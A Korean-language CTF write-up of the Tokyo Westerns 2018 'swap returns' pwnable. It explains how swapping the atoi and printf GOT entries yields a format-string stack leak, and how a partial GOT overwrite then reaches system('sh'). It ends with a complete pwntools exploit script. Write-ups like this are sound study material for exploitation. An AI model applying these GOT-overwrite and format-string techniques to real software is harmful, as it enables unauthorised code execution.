---
title: Tokyo Westerns 2018 - swap returns
date: 2024-07-12 00:00:00 +0900
categories: [Pwnable, CTF]
tags: [pwnable, ctf, fsb, got overwrite]
---
## 0x00. Introduction

``` bash
[*] '/home/user/swap_returns'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Concept

``` c
int __fastcall __noreturn main()
{
  ...
      print_menu();
      choice = read_int();
      if ( choice == 1 )
      {
        puts("1st address: ");
        __isoc99_fscanf(stdin, "%lu", &first);
        puts("2nd address: ");
        __isoc99_fscanf(stdin, "%lu", &second);
      }
      if ( choice == 2 )
      {
        tmp = *first;
        *first = *second;
        *second = tmp;
        tmp = 0LL;
      }
  ...
}
```

값을 두 개 입력받고, 그 값이 가리키는 값을 서로 바꿔준다.

쉽게 말하면 두 주소를 입력받아 주소에 저장된 값을 서로 바꿔준다.

## 0x01. Vulnerability

문제에서 강력한 primitive를 주었지만 생각보다 해볼 만한 것이 없었다.

우선 지금 가지고 있는 것으로부터 할 수 있는 것을 생각해보면, **쓰기 권한이 있고, 고정적인 주소값들끼리 swap이 가능**하다.

따라서 먼저 이러한 조건이 맞는 주소를 확인해보았다.

```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/user/hassan/week-2/swap/swap_returns
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/user/hassan/week-2/swap/swap_returns
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/user/hassan/week-2/swap/swap_returns
0x00007ffff7d87000 0x00007ffff7d8a000 0x0000000000000000 rw-
0x00007ffff7d8a000 0x00007ffff7db2000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7db2000 0x00007ffff7f47000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f47000 0x00007ffff7f9f000 0x00000000001bd000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9f000 0x00007ffff7fa0000 0x0000000000215000 --- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7fa0000 0x00007ffff7fa4000 0x0000000000215000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7fa4000 0x00007ffff7fa6000 0x0000000000219000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7fa6000 0x00007ffff7fb3000 0x0000000000000000 rw-
0x00007ffff7fbb000 0x00007ffff7fbd000 0x0000000000000000 rw-
0x00007ffff7fbd000 0x00007ffff7fc1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc1000 0x00007ffff7fc3000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc3000 0x00007ffff7fc5000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fc5000 0x00007ffff7fef000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fef000 0x00007ffff7ffa000 0x000000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000037000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000039000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
```

편의를 위해 ASLR을 꺼서 그렇지, 고정적인 주소는 `Text`, `Data`, `BSS` 영역밖에 없고, Partial RELRO가 적용되어 있어 쓰기가 가능한건 `Data` 영역밖에 없다.

여기에서 stack이든 libc든 leak을 해서 다음 단계로 넘어가야 한다는 생각을 했다.

따라서 `Data` 영역의 어떤 값들을 swap해야 leak이 가능할지 고민했다.

``` bash
0x601000:       0x0000000000600e20
0x601008:       0x00007ffff7ffe2e0
0x601010:       0x00007ffff7fd8d30
0x601018 <_exit@got.plt>:       0x0000000000400686
0x601020 <__isoc99_fscanf@got.plt>:     0x0000000000400696
0x601028 <puts@got.plt>:        0x00007ffff7e0ae50
0x601030 <__stack_chk_fail@got.plt>:    0x00000000004006b6
0x601038 <printf@got.plt>:      0x00000000004006c6
0x601040 <read@got.plt>:        0x00007ffff7e9e7d0
0x601048 <setvbuf@got.plt>:     0x00007ffff7e0b5f0
0x601050 <atoi@got.plt>:        0x00000000004006f6
0x601080 <stdout@@GLIBC_2.2.5>: 0x00007ffff7fa5780
0x601090 <stdin@@GLIBC_2.2.5>:  0x00007ffff7fa4aa0
0x6010a0 <stderr@@GLIBC_2.2.5>: 0x00007ffff7fa56a0
0x6010a8 <completed.7561>:      0x0000000000000000
```

거의 대부분이 GOT인데 멍청한 죄로 함수 조합별로 어떻게 동작을 할 지 엄청나게 고민을 많이 하다가 너무 복잡해져서 문제를 좀 간단하게 만들어보자는 생각이 들었다.

어찌 됐건 다르게 동작하는 두 함수를 바꾸는 것이기에, 가능하면 두 함수가 분리되어 있는 것이 좋겠다는 생각을 해서 바이너리의 함수 호출을 간결하게 표현해보았다.

``` c
main() {
    puts();
    fscanf();
    atoi();
    if(c == 1) {
        puts();
        fscanf();
    }
    if(c == 2) {
        X
    }
    if(c == 3) {
        printf();
        exit();
    }
}
```

예를 들어, `puts()`와 `fscanf()`를 swap하게 된다면, swap한 이후 `main()`의 첫 번째 `puts()`에서 바로 에러가 날 것이므로, swap할 두 함수는 실행 흐름상 분리되어있는 것이 좋다.

이렇게 저렇게 조합하다보니, `printf()`와 `atoi()`를 swap하면 재밌는 일이 생긴다.

두 함수는 `3. Exit`을 호출하기 전에 절대 같은 흐름에서 실행될 수가 없는 함수들이다.

``` c
read(0, &buf, 2uLL);
atoi(&buf); -> printf(&buf);
```

이렇게 `buf`에 2바이트 입력을 받고, 값을 출력하는 동작을 하게되는데 formatter 없이 주소값이 직접 들어가기 때문에 FSB가 발생하게 된다.

입력받는 길이가 2바이트라서 걱정했는데 다행히 `%p`를 넣으니 바로 `buf`의 주소가 leak이 됐다.

``` bash
[*] stack : 0x7fffffffe136
```

## 0x02. Exploit

Stack leak이 가능하므로 이제 stack과 GOT를 바꿀 수 있다!

ASLR이 켜져있어도 어차피 함수들끼리의 offset이 `0xXXXX` ~ `0xXXXXX`정도 차이밖에 나지 않으니, 하위 바이트만 원하는 함수의 주소로 잘 덮으면 될 것 같았다.

문제는 입력을 어떻게 줄 것인가인데, 처음에는 `buf`에 값을 쓰고 GOT와 swap하려고 했다.

```
.text:00000000004008A9                 mov     edx, 2          ; nbytes
.text:00000000004008AE                 mov     rsi, rax        ; buf
.text:00000000004008B1                 mov     edi, 0          ; fd
.text:00000000004008B6                 call    _read
.text:00000000004008BB                 lea     rax, [rbp+buf]
.text:00000000004008BF                 mov     rdi, rax        ; nptr
.text:00000000004008C2                 call    _atoi
.text:00000000004008C7                 mov     [rbp+var_10], eax
.text:00000000004008CA                 mov     [rbp+buf], 0
```

하지만 값이 제대로 써지지 않아 디버깅을 해보니, `buf`를 `atoi()`이후 0으로 밀어버리는 instruction이 있었다.

어쩔 수 없이 원하는 바이트 코드를 stack 주변에서 찾아서 조합한 후 GOT와 swap하는 방향으로 payload를 작성했다.

``` bash
gef➤  p system - atoi
$1 = 0xd730
gef➤  p system
$2 = {int (const char *)} 0x7ffff7ddad70 <__libc_system>
gef➤  p atoi
$3 = {int (const char *)} 0x7ffff7dcd640 <__GI_atoi>
```

`system`과 `atoi`의 offset 차이는 `0xd730`으로, 총 2.5(?)바이트를 덮어야하는 것 처럼 보이지만,

```
gef➤  p system
$1 = {int (const char *)} 0x7fc72ec5dd70 <__libc_system>
gef➤  p atoi
$2 = {int (const char *)} 0x7fc72ec50640 <__GI_atoi>
```

ASLR이 1/16 확률로 `atoi`의 하위 2바이트를 `0x0640`에 로드했을 경우에 `system`과 `atoi`의 주소 차이는 단 2바이트밖에 차이가 나지 않는다.

그래서 위 예시처럼 `system`의 하위 2바이트가 `0xdd70`일 경우를 생각하고 stack을 뒤져봤는데, 웬걸 `0xdd`가 아무리 찾아도 없었다.

어차피 `0xdd70`이나 `0xed70`이나 `0xfd70`이나 확률은 똑같고, 2바이트 차이나는 것도 똑같으므로 다른 값은 있나 확인해본 결과, `0xed`를 찾았다.

```
gef➤  x/b $rsp - 0xa2f
0x7ffd39354481: 0x70
gef➤  x/b $rsp - 0xe48
0x7ffd39354068: 0xed
```

결과적으로 `atoi`를 `system`으로 덮게 되면 `system(&buf)` 형식으로 호출을 할 수가 있게 되는데, `buf`에 `"sh"`를 넣으면 쉘을 실행할 수 있다.

## 0x03. Payload

``` python
from pwn import *
from pwnlib.util.packing import p32, p64, u32, u64
import sys

DEBUG = True
BINARY = "swap_returns"
LIBRARY = "libc.so.6"

bp = {
    '_set' : 0x40092C,
    'swap' : 0x400984,
    '_exit' : 0x4009b2,
    'atoi_of_read_int' : 0x4008c2,
    'free_space' : 0x601060,
}

gs = f'''
b *{bp['atoi_of_read_int']}
!b *{bp['_set']}
!b *{bp['swap']}
!b *{bp['_exit']}
continue
'''
context.terminal = ['tmux', 'splitw', '-hf']

def _set(s, first, second):
    s.send(b"1")
    s.recv()
    s.sendline(str(first).encode())
    s.recv()
    s.sendline(str(second).encode())
    return s.recv()

def swap(s):
    s.send(b"2")
    return s.recv()

def _exit(s):
    s.send(b"3")
    return s.recv()

def invalid(s):
    s.send(b"4")
    return s.recv()

def main():
    if(len(sys.argv) > 1):
        s = process(BINARY)
    else:
        s = process(BINARY)
        if DEBUG:
            gdb.attach(s, gs)
    elf = ELF(BINARY)
    lib = ELF(LIBRARY)

    s.recv()

    # lazy binding printf
    invalid(s)

    # swap atoi <-> printf
    _set(s, elf.got['atoi'], elf.got['printf'])
    swap(s)
    s.send(b"%p")
    stack = int(s.recv().split(b"1.")[0], 16)
    offset_0x70 = stack - 0xa15
    offset_0xed = stack - 0xe2e
    log.info(f"stack : {hex(stack)}")
    log.info(f"addr of 0x70 : {hex(offset_0x70)}")
    log.info(f"addr of 0xed : {hex(offset_0xed)}")

    # restore printf <-> atoi
    s.send(b"BB")
    s.recv()

    # collect data and overwrite to atoi.got
    _set(s, bp['free_space'] + 6, offset_0x70)
    swap(s)
    _set(s, bp['free_space'] + 7, offset_0xed)
    swap(s)
    _set(s, bp['free_space'], elf.got['atoi'] - 6)
    swap(s)

    # system("sh");
    s.send(b"sh")

    s.interactive()

if __name__=='__main__':
    main()
```